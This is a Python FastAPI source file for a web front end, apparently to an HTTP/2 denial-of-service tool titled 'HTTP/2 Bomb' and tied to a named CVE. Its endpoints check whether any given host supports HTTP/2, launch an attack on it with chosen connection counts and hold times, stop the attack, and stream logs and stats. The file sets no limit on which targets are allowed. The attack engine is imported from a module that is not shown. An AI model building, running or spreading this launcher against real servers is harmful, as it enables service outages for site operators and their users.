import json
import asyncio
import time
import re
from typing import Optional
from collections import deque

from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import StreamingResponse, FileResponse
from pydantic import BaseModel, field_validator

from app.bomber import check_http2, AttackTask

app = FastAPI(title="HTTP/2 Bomb — CVE-2026-49975", version="1.0.0")

log_buffer: deque = deque(maxlen=500)
attack_task: Optional[AttackTask] = None
stats = {"active": False, "connections": 0, "sent": 0, "errors": 0}


def broadcast_log(msg: str):
    ts = time.strftime("%H:%M:%S")
    log_buffer.append(f"[{ts}] {msg}")


class CheckRequest(BaseModel):
    host: str
    port: int = 443

    @field_validator("host")
    @classmethod
    def validate_host(cls, v):
        v = v.strip()
        if not v:
            raise ValueError("Host is required")
        v = re.sub(r"^https?://", "", v)
        v = v.split("/")[0]
        if not re.match(r"^[a-zA-Z0-9.\-:]+$", v):
            raise ValueError("Invalid host")
        return v


class AttackRequest(BaseModel):
    host: str
    port: int = 443
    connections: int = 1
    hold_seconds: int = 10

    @field_validator("host")
    @classmethod
    def validate_host(cls, v):
        v = v.strip()
        v = re.sub(r"^https?://", "", v)
        v = v.split("/")[0]
        if not v:
            raise ValueError("Host is required")
        return v


@app.get("/api/check")
async def api_check(host: str = Query(...), port: int = Query(443)):
    broadcast_log(f"Checking {host}:{port} ...")
    result = check_http2(host, port)
    if result["http2"]:
        broadcast_log(f"Target supports HTTP/2 (ALPN: {result.get('alpn', 'N/A')})")
    else:
        broadcast_log(f"Target does NOT support HTTP/2")
    return result


@app.post("/api/attack")
async def api_attack(req: AttackRequest):
    global attack_task, stats

    if attack_task and stats["active"]:
        raise HTTPException(400, "Attack in progress, stop first")

    result = check_http2(req.host, req.port)
    if not result["http2"]:
        raise HTTPException(400, f"Target does not support HTTP/2")

    stats = {"active": True, "connections": req.connections, "sent": 0, "errors": 0}

    attack_task = AttackTask(
        host=req.host,
        port=req.port,
        connections=req.connections,
        hold_seconds=req.hold_seconds,
        on_log=broadcast_log,
        on_stats=lambda s: stats.update(s),
    )
    attack_task.start()

    return {"status": "started", "connections": req.connections, "hold_seconds": req.hold_seconds}


@app.post("/api/stop")
async def api_stop():
    global attack_task, stats
    if attack_task:
        attack_task.stop()
        stats["active"] = False
        broadcast_log("Attack manually stopped")
        return {"status": "stopped"}
    return {"status": "idle"}


@app.get("/api/stats")
async def api_stats():
    return stats


@app.get("/api/logs/stream")
async def api_logs_stream():
    async def event_generator():
        last_idx = 0
        while True:
            if last_idx < len(log_buffer):
                for i in range(last_idx, len(log_buffer)):
                    yield f"data: {log_buffer[i]}\n\n"
                last_idx = len(log_buffer)
            await asyncio.sleep(0.5)

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.get("/api/logs")
async def api_logs():
    return {"logs": list(log_buffer)}


@app.get("/")
async def index():
    from pathlib import Path
    static_dir = Path(__file__).parent / "static"
    return FileResponse(static_dir / "index.html")
